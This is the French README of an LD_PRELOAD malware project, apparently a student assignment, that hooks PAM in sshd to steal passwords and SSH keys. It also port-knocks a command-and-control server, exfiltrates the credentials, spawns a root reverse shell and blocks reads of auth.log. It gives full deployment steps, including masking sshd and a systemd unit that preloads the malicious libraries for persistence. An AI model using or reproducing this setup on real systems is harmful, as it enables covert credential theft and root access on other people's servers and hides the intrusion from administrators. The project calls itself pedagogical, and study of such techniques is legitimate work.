Projet Malware LD_PRELOAD

Introduction
Ce projet a pour objectif de démontrer comment utiliser un malware avec  la technique LD_PRELOAD pour intercepter et modifier le comportement d'un serveur SSH. En surchargeant certaines fonctions critiques (via des bibliothèques partagées), le malware extrait les identifiants (login et mot de passe) et les clés SSH de la victime.
De plus, un mécanisme de port knocking permet de signaler au serveur de Commande & Contrôle (C2) qu'une séquence d'accès est validée, déclenchant ainsi l'ouverture d'un reverse shell pour un accès interactif.
Enfin, une bibliothèque complémentaire bloque l'accès à certains fichiers sensibles pour empêcher leur lecture par l'utilisateur.

Fonctionnalités :

Interception des Credentials et copie des clés SSH :

Utilisations des fonctions PAM  via LD_PRELOAD afin d'extraire le login, le mot de passe de l'utilisateur.
Utilisation de getpwnam() pour déterminer dynamiquement le répertoire personnel de l'utilisateur afin de lire les clés depuis le dossier ~/.ssh.

Port Knocking :
Envoi de trois connexions TCP successives sur des ports prédéfinis avec un délai entre chaque appel, permettant au C2 de détecter et d'ouvrir les services de réception.

Reverse Shell :

Lancement d'un shell interactif (via forkpty()) qui redirige son entrée/sortie sur une connexion TCP vers le C2.

Blocage de Fichiers Sensibles :

Appel des fonctions d’accès aux fichiers (open(), openat(), fopen()) pour empêcher l’accès à des fichiers critiques ou contenant des logs (ex. /var/log/auth.log).

Structure du Projet :

pam_auth_logger.c
Cette bibliothèque partagée, injectée via LD_PRELOAD, intercepte les fonctions PAM pour récupérer les credentials et les clés SSH. Elle effectue ensuite le port knocking, envoie un fichier contenant les informations exfiltrées au C2 et lance un reverse shell.

block_files.c
Bibliothèque partagée également injectée via LD_PRELOAD, qui surcharge les fonctions d'accès aux fichiers pour bloquer l'accès à certains fichiers.

c2 (serveur de Commande & Contrôle)
Le serveur C2  est configuré pour :

Surveiller les ports de port knocking.
Recevoir le fichier credentials.txt.
Accepter les connexions du reverse shell .


Installation et Utilisation
Pré-requis
Sur la machine victime  installez les outils de compilation et la bibliothèque PAM (pour le C2 installez juste build-essential) :

sudo apt install -y build-essential libpam0g-dev openssh-server

Compilation
Cloner le projet et compiler :

git clone https://github.com/snipzr/Partiel_C.git
cd Partiel_C

Pour le compiler sur la victime :

make clean && make

Pour compiler le C2 (dans Partiel_C allez dans le dossier C2) :

gcc -o c2 c2.c

modifiez les port utilisés si vous souhaitez :

Sur le C2 dans le fichier c2, lignes 11 à 16

Modifiez avec les memes port dans le pam_auth_logger.c (lignes 34 à 38).
Mais surtout n'oubliez pas de changer l'adresse ip du C2 (ligne 33) sinon ca ne fonctionnera pas.


Déploiement sur la Machine Victime

Arrêter le service SSH existant :

sudo systemctl stop sshd
sudo systemctl disable sshd
sudo systemctl mask sshd

On va créer un service qui charge automatiquement LD_PRELOAD au démarrage.

vim /etc/systemd/system/ld_preload_sshd.service

on vas y coller le contenu suivant :

[Unit]
Description=SSH Daemon with LD_PRELOAD
After=network.target

[Service]
Environment="LD_PRELOAD=/chemin/vers/libpam_auth_logger.so:/chemin/vers/block_files.so"
ExecStart=/usr/sbin/sshd -D
Restart=on-failure
RestartSec=5s
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target

Appliquer et démarrer le service :

sudo systemctl daemon-reload
sudo systemctl enable ld_preload_sshd
sudo systemctl start ld_preload_sshd


Déploiement sur le Serveur C2

lancez l'écoute grce a la commande :

./c2


Connexion SSH via une autre machine:
connectez-vous en SSH à la machine victime. Cette connexion déclenchera :

L'interception et l'écriture du login, du mot de passe et la copie  des clés SSH dans /tmp/credentials.txt.
Le port knocking et l'envoi du fichier au C2 sous le nom de credentials_<IP_victime> .
Le lancement d'un reverse shell en root vers le C2.

Explications Techniques

Fonctionnement du Linker et de LD_PRELOAD

Le linker dynamique (ld.so) est chargé au démarrage d'un programme de lier dynamiquement les bibliothèques partagées. La variable d'environnement LD_PRELOAD permet d'indiquer au linker de charger, en priorité, une ou plusieurs bibliothèques spécifiées avant les bibliothèques système.
Dans notre projet, cela permet d'injecter nos bibliothèques personnalisées (libpam_auth_logger.so et block_files.so) dans le processus SSH sans modifier le binaire d'OpenSSH. Ainsi, nous pouvons intercepter et surcharger les fonctions critiques (comme pam_get_item, open, etc.) pour extraire des données sensibles ou bloquer l'accès à certains fichiers.

Fonctionnement des Threads sur Linux

Un thread est une unité d'exécution légère au sein d'un processus qui partage le même espace mémoire que les autres threads du même processus.
Dans notre serveur C2, les threads sont utilisés pour :

Écouter simultanément sur plusieurs ports (port knocking, réception des credentials, reverse shell).
Permettre une gestion concurrente des connexions entrantes sans bloquer l'ensemble du service.
Chaque thread s'exécute indépendamment, ce qui permet au serveur de rester réactif même en cas de multiples connexions simultanées.

Exemple dans le Projet

LD_PRELOAD est utilisé dans pam_auth_logger.c pour que, lors d'une connexion SSH, notre bibliothèque soit chargée avant les bibliothèques PAM système. Cela permet d'intercepter l'authentification et d'extraire les informations sensibles.

Threads (dans le code du serveur C2, par exemple) sont employés pour lancer des écouteurs sur différents ports en parallèle. Chaque thread gère une tâche spécifique (port knocking, réception des fichiers, reverse shell), garantissant ainsi une exécution concurrente efficace.



Conclusion
Ce projet démontre comment combiner LD_PRELOAD, l'injection de bibliothèques personnalisées et l'utilisation de threads pour intercepter et exfiltrer discrètement des informations sensibles, tout en bloquant l'accès à certains fichiers critiques.
Bien que ce projet soit à but pédagogique, il met en œuvre des techniques avancées d'injection dynamique et d'exécution parallèle sur Linux.
